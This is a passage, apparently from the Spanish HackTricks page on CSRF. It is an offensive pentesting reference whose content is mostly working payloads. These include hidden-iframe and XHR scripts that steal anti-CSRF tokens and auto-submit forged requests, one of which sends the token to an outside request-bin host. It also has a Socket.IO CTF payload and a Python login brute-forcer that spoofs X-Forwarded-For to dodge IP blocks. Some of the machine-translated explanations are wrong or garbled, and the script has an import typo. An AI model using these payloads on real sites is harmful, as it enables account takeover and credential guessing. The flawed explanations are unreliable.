Estas t√©cnicas permiten a un atacante realizar acciones no autorizadas en nombre del usuario, lo que puede llevar a la modificaci√≥n de datos, la ejecuci√≥n de acciones no deseadas o incluso la toma de control de la cuenta del usuario. Es importante que los desarrolladores implementen medidas de protecci√≥n adecuadas, como el uso de tokens CSRF y la validaci√≥n de referencias, para mitigar este tipo de ataques.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Robar el token CSRF y enviar una solicitud POST utilizando un iframe y un formulario**

Una t√©cnica com√∫n para llevar a cabo un ataque de falsificaci√≥n de solicitudes entre sitios (CSRF) es robar el token CSRF de un usuario y luego utilizarlo para enviar una solicitud POST maliciosa. Esto se puede lograr utilizando un iframe y un formulario.

1. Primero, es necesario obtener el token CSRF del usuario. Esto se puede hacer mediante ingenier√≠a inversa o mediante la explotaci√≥n de una vulnerabilidad en la aplicaci√≥n web.

2. Una vez que se ha obtenido el token CSRF, se puede utilizar un iframe para cargar una p√°gina maliciosa en el navegador del usuario. El iframe debe apuntar a la URL de destino donde se realizar√° la solicitud POST.

```html
<iframe src="https://www.ejemplo.com/vulnerable-page" style="display:none;"></iframe>
```

3. Dentro de la p√°gina maliciosa cargada en el iframe, se debe incluir un formulario oculto que contenga los par√°metros necesarios para la solicitud POST. Aseg√∫rese de incluir el token CSRF robado en el formulario.

```html
<form action="https://www.ejemplo.com/vulnerable-page" method="POST">
  <input type="hidden" name="param1" value="valor1">
  <input type="hidden" name="param2" value="valor2">
  <input type="hidden" name="csrf_token" value="token_csrf_robado">
  <input type="submit" value="Submit">
</form>
```

4. Cuando el usuario carga la p√°gina maliciosa, el formulario se enviar√° autom√°ticamente debido al uso del atributo `submit`. Esto enviar√° la solicitud POST con los par√°metros y el token CSRF robado al servidor de destino.

Al utilizar esta t√©cnica, un atacante puede enga√±ar al usuario para que realice acciones no deseadas en su nombre, como cambiar la contrase√±a, realizar compras o eliminar datos. Es importante que los desarrolladores implementen medidas de protecci√≥n adecuadas, como el uso de tokens CSRF y la validaci√≥n de referencias, para mitigar este tipo de ataques.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Robar token y enviarlo usando 2 iframes**

En esta t√©cnica de CSRF, el atacante roba el token de autenticaci√≥n de la v√≠ctima y lo env√≠a a trav√©s de dos iframes. El objetivo es enga√±ar al navegador de la v√≠ctima para que realice una solicitud no deseada en nombre del usuario autenticado.

El proceso se divide en los siguientes pasos:

1. El atacante crea una p√°gina web maliciosa que contiene dos iframes. Uno de los iframes se carga con la p√°gina de destino que se desea atacar, mientras que el otro se carga con una p√°gina controlada por el atacante.

2. Cuando la v√≠ctima visita la p√°gina maliciosa, el navegador carga los iframes autom√°ticamente.

3. El iframe controlado por el atacante realiza una solicitud GET a la p√°gina de destino, aprovechando el token de autenticaci√≥n almacenado en las cookies de la v√≠ctima.

4. La p√°gina de destino recibe la solicitud y la procesa como si fuera leg√≠tima, ya que incluye el token de autenticaci√≥n v√°lido.

5. El atacante puede aprovechar esta solicitud para realizar acciones no autorizadas en nombre de la v√≠ctima, como cambiar la contrase√±a, realizar compras o realizar cualquier otra acci√≥n permitida por la p√°gina de destino.

Es importante destacar que esta t√©cnica solo funciona si la p√°gina de destino no implementa medidas de protecci√≥n contra CSRF, como tokens de solicitud aleatorios o verificaci√≥n de origen. Por lo tanto, es fundamental que los desarrolladores implementen estas medidas de seguridad para proteger sus aplicaciones web contra este tipo de ataques.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRobar token CSRF con Ajax y enviar un post con un formulario**

En esta t√©cnica, aprovechamos una vulnerabilidad de Cross-Site Request Forgery (CSRF) para robar el token CSRF de un usuario y luego enviar una solicitud POST utilizando Ajax y un formulario falso.

#### **Pasos:**

1. Identificar la p√°gina objetivo que contiene la funcionalidad vulnerable de CSRF.

2. Crear un formulario HTML falso en nuestra p√°gina maliciosa con los campos necesarios para la solicitud POST que queremos enviar.

3. Utilizar Ajax para enviar una solicitud GET a la p√°gina objetivo y extraer el token CSRF del cuerpo de la respuesta.

4. Insertar el token CSRF en el formulario falso que creamos en el paso 2.

5. Utilizar Ajax para enviar una solicitud POST a la p√°gina objetivo utilizando el formulario falso y el token CSRF robado.

#### **Ejemplo de c√≥digo:**

```html
<script>
    // Paso 3: Extraer el token CSRF de la p√°gina objetivo
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.ejemplo.com/pagina-objetivo", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = xhr.responseText;
            var csrfToken = extractCSRFToken(response);

            // Paso 4: Insertar el token CSRF en el formulario falso
            document.getElementById("csrfToken").value = csrfToken;

            // Paso 5: Enviar la solicitud POST con el formulario falso
            var formData = new FormData(document.getElementById("fakeForm"));
            xhr.open("POST", "https://www.ejemplo.com/pagina-objetivo", true);
            xhr.send(formData);
        }
    };
    xhr.send();

    function extractCSRFToken(response) {
        // L√≥gica para extraer el token CSRF del cuerpo de la respuesta
    }
</script>

<form id="fakeForm" action="https://www.ejemplo.com/pagina-objetivo" method="POST">
    <input type="hidden" name="csrfToken" id="csrfToken" value="">
    <!-- Agregar otros campos necesarios para la solicitud POST -->
</form>
```

En este ejemplo, utilizamos Ajax para enviar una solicitud GET a la p√°gina objetivo y extraer el token CSRF del cuerpo de la respuesta. Luego, insertamos el token CSRF en un formulario falso y utilizamos Ajax nuevamente para enviar una solicitud POST a la p√°gina objetivo utilizando el formulario falso y el token CSRF robado.

Es importante tener en cuenta que esta t√©cnica solo funcionar√° si la p√°gina objetivo no implementa medidas de protecci√≥n adecuadas contra CSRF, como tokens CSRF aleatorios y verificaci√≥n de origen.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF con Socket.IO

Socket.IO es una biblioteca de JavaScript que permite la comunicaci√≥n bidireccional en tiempo real entre el cliente y el servidor. Aunque Socket.IO proporciona una capa de seguridad incorporada, a√∫n es posible que un atacante aproveche una vulnerabilidad de falsificaci√≥n de solicitudes entre sitios (CSRF) para realizar acciones no deseadas en nombre del usuario.

#### ¬øQu√© es CSRF?

La falsificaci√≥n de solicitudes entre sitios (CSRF) es un tipo de ataque en el que un atacante enga√±a a un usuario para que realice una acci√≥n no deseada en un sitio web en el que el usuario est√° autenticado. Esto se logra enga√±ando al usuario para que haga clic en un enlace o bot√≥n malicioso que realiza una solicitud HTTP en segundo plano sin su conocimiento.

#### CSRF con Socket.IO

Socket.IO utiliza cookies para mantener la sesi√≥n del usuario y autenticar las solicitudes entrantes. Sin embargo, las cookies no son suficientes para proteger contra ataques CSRF, ya que los navegadores modernos no env√≠an autom√°ticamente las cookies en solicitudes realizadas a trav√©s de JavaScript.

Para protegerse contra CSRF en una aplicaci√≥n que utiliza Socket.IO, se deben implementar medidas adicionales. Una forma com√∫n de hacerlo es incluir un token CSRF en cada solicitud y verificar su validez en el servidor.

#### Implementaci√≥n de protecci√≥n CSRF en Socket.IO

1. Generar un token CSRF √∫nico para cada sesi√≥n de usuario y almacenarlo en una cookie segura.
2. Incluir el token CSRF en cada solicitud enviada desde el cliente a trav√©s de Socket.IO.
3. Verificar la validez del token CSRF en el servidor antes de procesar la solicitud.

Al implementar esta protecci√≥n CSRF en Socket.IO, se asegura de que solo las solicitudes leg√≠timas, que incluyen el token CSRF correcto, sean procesadas por el servidor. Cualquier solicitud sin un token v√°lido ser√° rechazada, lo que ayuda a prevenir ataques CSRF exitosos.

Es importante tener en cuenta que la protecci√≥n CSRF en Socket.IO debe ser implementada de manera adecuada y exhaustiva para garantizar la seguridad de la aplicaci√≥n. Adem√°s, es recomendable seguir las mejores pr√°cticas de seguridad en el desarrollo de aplicaciones web para minimizar el riesgo de ataques CSRF y otros tipos de vulnerabilidades.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Ataque de Fuerza Bruta en el Inicio de Sesi√≥n

El c√≥digo se puede utilizar para realizar un ataque de fuerza bruta en un formulario de inicio de sesi√≥n utilizando un token CSRF (tambi√©n utiliza el encabezado X-Forwarded-For para intentar evadir un posible bloqueo de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Herramientas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referencias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
